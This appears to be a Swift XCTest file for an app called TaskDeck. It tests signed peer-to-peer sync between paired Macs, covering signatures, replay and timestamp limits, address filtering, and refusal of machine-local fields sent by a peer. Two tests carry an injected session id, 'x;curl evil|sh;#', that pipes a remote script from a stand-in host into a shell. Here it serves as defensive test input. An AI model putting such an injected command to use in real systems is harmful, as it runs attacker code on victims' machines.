import XCTest
@testable import TaskDeck

final class PeerAuthTests: XCTestCase {
    private let secret = "test-secret-not-a-real-one"
    private let body = Data(#"{"schema":1}"#.utf8)
    private var now: String { String(Int(Date().timeIntervalSince1970)) }

    func testSignedRequestVerifies() {
        let time = now
        let signature = PeerAuth.signature(secret: secret, method: "POST", path: "/sync", time: time, body: body)
        XCTAssertTrue(PeerAuth.verify(secret: secret, method: "POST", path: "/sync", time: time, body: body, signature: signature))
    }

    func testWrongSecretChangedBodyOrPathFail() {
        let time = now
        let signature = PeerAuth.signature(secret: secret, method: "POST", path: "/sync", time: time, body: body)
        XCTAssertFalse(PeerAuth.verify(secret: "other", method: "POST", path: "/sync", time: time, body: body, signature: signature))
        XCTAssertFalse(PeerAuth.verify(secret: secret, method: "POST", path: "/sync", time: time, body: Data("{}".utf8), signature: signature))
        XCTAssertFalse(PeerAuth.verify(secret: secret, method: "POST", path: "/other", time: time, body: body, signature: signature))
        XCTAssertFalse(PeerAuth.verify(secret: secret, method: "POST", path: "/sync", time: time, body: body, signature: "garbage"))
    }

    func testOldOrFutureRequestFails() {
        for offset in [-(PeerAuth.window + 5), PeerAuth.window + 5] {
            let time = String(Int(Date().timeIntervalSince1970 + offset))
            let signature = PeerAuth.signature(secret: secret, method: "POST", path: "/sync", time: time, body: body)
            XCTAssertFalse(PeerAuth.verify(secret: secret, method: "POST", path: "/sync", time: time, body: body, signature: signature))
        }
    }

    func testAnswerIsBoundToItsRequest() {
        let time = now
        let answer = PeerAuth.signature(secret: secret, method: "200", path: "/sync", time: time, body: body, answering: "request-1")
        XCTAssertTrue(PeerAuth.verify(secret: secret, method: "200", path: "/sync", time: time, body: body, signature: answer, answering: "request-1"))
        XCTAssertFalse(PeerAuth.verify(secret: secret, method: "200", path: "/sync", time: time, body: body, signature: answer, answering: "request-2"))
    }

    func testReplayIsRefused() {
        let seen = SeenRequests()
        XCTAssertTrue(seen.firstTime("sig"))
        XCTAssertFalse(seen.firstTime("sig"))
        XCTAssertTrue(seen.firstTime("other"))
    }

    func testOnlyTailscaleAddressesAreAccepted() {
        XCTAssertTrue(TailscaleAddress.isTailscale("100.109.180.47"))
        XCTAssertTrue(TailscaleAddress.isTailscale("fd7a:115c:a1e0::1301:b4d8"))
        XCTAssertFalse(TailscaleAddress.isTailscale("192.168.1.10"))
        XCTAssertFalse(TailscaleAddress.isTailscale("127.0.0.1"))
        XCTAssertFalse(TailscaleAddress.isTailscale("100.128.0.1"))
    }

    func testSecretsAreRandomAndLong() {
        let a = PeerAuth.newSecret(), b = PeerAuth.newSecret()
        XCTAssertNotEqual(a, b)
        XCTAssertEqual(Data(base64Encoded: a)?.count, 32)
    }

    func testMessageParsing() throws {
        let raw = PeerHTTP.encode(head: "POST /sync HTTP/1.1", headers: ["X-Test": "1"], body: Data("hello".utf8))
        XCTAssertNil(try PeerHTTP.parse(raw.prefix(10)))
        XCTAssertNil(try PeerHTTP.parse(raw.dropLast(2)))
        let message = try XCTUnwrap(PeerHTTP.parse(raw))
        XCTAssertEqual(message.head, "POST /sync HTTP/1.1")
        XCTAssertEqual(message.header("x-test"), "1")
        XCTAssertEqual(message.body, Data("hello".utf8))
        let huge = Data("POST /sync HTTP/1.1\r\nContent-Length: \(PeerHTTP.maxBody + 1)\r\n\r\n".utf8)
        XCTAssertThrowsError(try PeerHTTP.parse(huge))
    }

    func testPeerEndpoint() {
        XCTAssertEqual(PeerClient.endpoint("deskserver").host, "deskserver")
        XCTAssertEqual(PeerClient.endpoint("deskserver").port, PeerClient.defaultPort)
        XCTAssertEqual(PeerClient.endpoint("100.1.2.3:47622").port, 47622)
    }
}

extension PeerAuthTests {
    func testSameBodyInTheSameSecondStillDiffers() {
        let time = String(Int(Date().timeIntervalSince1970))
        let a = PeerAuth.signature(secret: "s", method: "POST", path: "/sync", time: time, body: Data(), nonce: UUID().uuidString)
        let b = PeerAuth.signature(secret: "s", method: "POST", path: "/sync", time: time, body: Data(), nonce: UUID().uuidString)
        XCTAssertNotEqual(a, b)
    }

    func testChangedNonceFails() {
        let time = String(Int(Date().timeIntervalSince1970))
        let signature = PeerAuth.signature(secret: "s", method: "POST", path: "/sync", time: time, body: Data(), nonce: "nonce-one-xxxxxxxx")
        XCTAssertFalse(PeerAuth.verify(secret: "s", method: "POST", path: "/sync", time: time, body: Data(),
                                       signature: signature, nonce: "nonce-two-xxxxxxxx"))
    }
}

/// A paired Mac must not be able to set what only this Mac decides.
final class PeerTrustTests: XCTestCase {
    func testNewRecordsFromAPeerArriveWithoutOneMacFields() throws {
        let spaceId = UUID(), taskId = UUID()
        // The other Mac sends a space and a task this Mac has never seen, with one-Mac fields filled in.
        var space = Project(id: spaceId, name: "Theirs")
        space.claudeHome = "~/.attacker"
        space.browser = "chrome"
        space.browserProfile = "Profile 9"
        space.sessionRunner = ClaudeCodeRunner.id
        var task = TaskItem(id: taskId, projectId: spaceId, title: "Looks normal")
        task.sessions = [AgentSession(worktreeId: "claude-code:x;curl evil|sh;#", name: "s", repoName: "r", agent: "claude",
                                      runner: ClaudeCodeRunner.id)]
        task.queueRepoId = "/tmp/elsewhere"
        let encoder = AppStore.Snapshot.recordEncoder
        var theirs = SyncDocument(schema: SyncSchema.current)
        theirs.records["space:\(spaceId.uuidString)"] = try encoder.encode(space)
        theirs.records["task:\(taskId.uuidString)"] = try encoder.encode(task)

        let mine = AppStore.Snapshot(projects: [], tasks: [])
        let merged = try mine.applying(SyncMerge.merge(mine.document(), theirs))
        XCTAssertEqual(merged.tasks.first?.title, "Looks normal")
        XCTAssertNil(merged.tasks.first?.sessions)
        XCTAssertNil(merged.tasks.first?.queueRepoId)
        XCTAssertNil(merged.projects.first?.claudeHome)
        XCTAssertNil(merged.projects.first?.browser)
        XCTAssertNil(merged.projects.first?.browserProfile)
        XCTAssertNil(merged.projects.first?.sessionRunner)
    }

    func testOnlyHexSessionIdsAreAccepted() {
        XCTAssertEqual(ClaudeCodeRunner.parse("claude-code:be6be5eb")?.short, "be6be5eb")
        XCTAssertEqual(ClaudeCodeRunner.parse("claude-code:1c8b6795@/Users/me/.claude-perso")?.home, "/Users/me/.claude-perso")
        XCTAssertNil(ClaudeCodeRunner.parse("claude-code:x;curl evil|sh;#"))
        XCTAssertNil(ClaudeCodeRunner.parse("claude-code:"))
        XCTAssertNil(ClaudeCodeRunner.parse("claude-code:abc def"))
        XCTAssertNil(ClaudeCodeRunner.parse("orca::abc"))
    }
}
